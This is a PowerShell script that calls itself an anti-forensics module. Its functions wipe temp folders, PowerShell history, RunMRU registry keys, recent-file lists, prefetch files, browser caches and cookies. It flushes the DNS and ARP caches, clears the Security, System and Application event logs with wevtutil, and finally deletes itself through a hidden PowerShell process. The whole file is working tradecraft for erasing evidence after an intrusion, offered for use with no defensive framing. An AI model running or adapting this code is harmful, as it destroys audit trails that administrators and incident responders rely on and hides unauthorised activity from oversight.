<#
.SYNOPSIS
    cleanup and anti-forensics module
.DESCRIPTION
    Removes traces of activity including temp files, history, logs, and registry entries
    WARNING: This module performs destructive operations
#>

function Clear-TempFolders {
    param(
        [switch]$Verbose
    )

    $tempPaths = @(
        $env:TEMP,
        $env:TMP,
        "$env:LOCALAPPDATA\Temp",
        "C:\Windows\Temp"
    )

    $deletedCount = 0
    $errors = 0

    foreach ($path in $tempPaths) {
        if (Test-Path $path) {
            try {
                $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                foreach ($item in $items) {
                    try {
                        Remove-Item -Path $item.FullName -Recurse -Force -ErrorAction Stop
                        $deletedCount++
                        if ($Verbose) { Write-Output "Deleted: $($item.FullName)" }
                    } catch {
                        $errors++
                    }
                }
            } catch {
                $errors++
            }
        }
    }

    Write-Output "Temp cleanup: $deletedCount items deleted, $errors errors"
}

function Clear-PowerShellHistory {
    $historyPaths = @(
        (Get-PSReadlineOption).HistorySavePath,
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )

    foreach ($path in $historyPaths) {
        if ($path -and (Test-Path $path)) {
            try {
                Remove-Item -Path $path -Force -ErrorAction Stop
                Write-Output "PowerShell history cleared: $path"
            } catch {
                Write-Output "Failed to clear: $path"
            }
        }
    }

    Clear-History -ErrorAction SilentlyContinue
}

function Clear-RunMRU {
    $runMRUPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
    )

    foreach ($path in $runMRUPaths) {
        try {
            if (Test-Path $path) {
                Remove-Item -Path $path -Recurse -Force -ErrorAction Stop
                Write-Output "Cleared registry: $path"
            }
        } catch {
            $keyPath = $path -replace 'HKCU:', 'HKEY_CURRENT_USER'
            $result = reg delete "$keyPath" /va /f 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-Output "Cleared registry: $path (via reg.exe)"
            }
        }
    }
}

function Clear-RecentFiles {
    $recentPaths = @(
        "$env:APPDATA\Microsoft\Windows\Recent",
        "$env:APPDATA\Microsoft\Office\Recent"
    )

    foreach ($path in $recentPaths) {
        if (Test-Path $path) {
            try {
                Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | 
                    Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                Write-Output "Recent files cleared: $path"
            } catch {
                Write-Output "Failed to clear: $path"
            }
        }
    }
}

function Clear-RecycleBinSafe {
    try {
        Clear-RecycleBin -Force -ErrorAction Stop
        Write-Output "Recycle Bin emptied"
    } catch {
        Write-Output "Failed to empty Recycle Bin: $($_.Exception.Message)"
    }
}

function Clear-EventLogs {
    param(
        [string[]]$LogNames = @('System', 'Application', 'Security', 'Windows PowerShell')
    )

    $cleared = 0
    $failed = 0

    foreach ($logName in $LogNames) {
        try {
            wevtutil cl $logName 2>&1 | Out-Null
            if ($LASTEXITCODE -eq 0) {
                $cleared++
                Write-Output "Cleared event log: $logName"
            } else {
                $failed++
            }
        } catch {
            $failed++
            Write-Output "Failed to clear log: $logName (may require admin rights)"
        }
    }

    Write-Output "Event logs: $cleared cleared, $failed failed"
}

function Clear-Prefetch {
    $prefetchPath = "C:\Windows\Prefetch"
    
    if (Test-Path $prefetchPath) {
        try {
            Get-ChildItem -Path $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue |
                Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Output "Prefetch files cleared"
        } catch {
            Write-Output "Failed to clear prefetch (may require admin rights)"
        }
    }
}

function Clear-DNSCache {
    try {
        ipconfig /flushdns | Out-Null
        Write-Output "DNS cache flushed"
    } catch {
        Write-Output "Failed to flush DNS cache"
    }
}

function Clear-ARPCache {
    try {
        arp -d 2>&1 | Out-Null
        Write-Output "ARP cache cleared"
    } catch {
        Write-Output "Failed to clear ARP cache"
    }
}

function Clear-BrowserCache {
    param(
        [switch]$Chrome,
        [switch]$Edge,
        [switch]$Firefox
    )

    if ($Chrome) {
        $chromeCachePaths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Code Cache"
        )
        foreach ($path in $chromeCachePaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item -Path "$path\*" -Recurse -Force -ErrorAction SilentlyContinue
                    Write-Output "Chrome cache cleared: $path"
                } catch {}
            }
        }
    }

    if ($Edge) {
        $edgeCachePaths = @(
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Code Cache"
        )
        foreach ($path in $edgeCachePaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item -Path "$path\*" -Recurse -Force -ErrorAction SilentlyContinue
                    Write-Output "Edge cache cleared: $path"
                } catch {}
            }
        }
    }

    if ($Firefox) {
        $firefoxProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like "*.default-release" } | Select-Object -First 1
        
        if ($firefoxProfile) {
            $cachePath = Join-Path $firefoxProfile.FullName "cache2"
            if (Test-Path $cachePath) {
                try {
                    Remove-Item -Path "$cachePath\*" -Recurse -Force -ErrorAction SilentlyContinue
                    Write-Output "Firefox cache cleared"
                } catch {}
            }
        }
    }
}

function Invoke-ComprehensiveCleanup {
    param(
        [switch]$IncludeEventLogs,
        [switch]$IncludeBrowserCache,
        [switch]$IncludePrefetch,
        [switch]$Aggressive
    )

    Write-Output "`n=== Starting Cleanup Operations ==="
    Write-Output "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"

    Clear-TempFolders
    Clear-PowerShellHistory
    Clear-RunMRU
    Clear-RecentFiles
    Clear-RecycleBinSafe
    Clear-DNSCache
    Clear-ARPCache

    if ($IncludeEventLogs) {
        Clear-EventLogs
    }

    if ($IncludeBrowserCache) {
        Clear-BrowserCache -Chrome -Edge -Firefox
    }

    if ($IncludePrefetch) {
        Clear-Prefetch
    }

    if ($Aggressive) {
        Write-Output "`nAggressive mode enabled - performing additional cleanup..."
        
        $additionalPaths = @(
            "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
            "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
            "$env:APPDATA\Microsoft\Windows\Cookies"
        )

        foreach ($path in $additionalPaths) {
            if (Test-Path $path) {
                try {
                    Remove-Item -Path "$path\*" -Recurse -Force -ErrorAction SilentlyContinue
                    Write-Output "Cleared: $path"
                } catch {}
            }
        }
    }

    Write-Output "`n=== Cleanup Operations Complete ===`n"
}

function Remove-SelfScript {
    param(
        [int]$DelaySeconds = 5
    )

    $scriptPath = $MyInvocation.PSCommandPath
    
    if ($scriptPath) {
        Write-Output "Self-destruct initiated. Script will be deleted in $DelaySeconds seconds..."
        
        $deleteCommand = @"
Start-Sleep -Seconds $DelaySeconds
Remove-Item -Path '$scriptPath' -Force -ErrorAction SilentlyContinue
"@
        
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden", "-Command", $deleteCommand -NoNewWindow
        Write-Output "Self-destruct scheduled"
    } else {
        Write-Output "Unable to determine script path - self-destruct aborted"
    }
}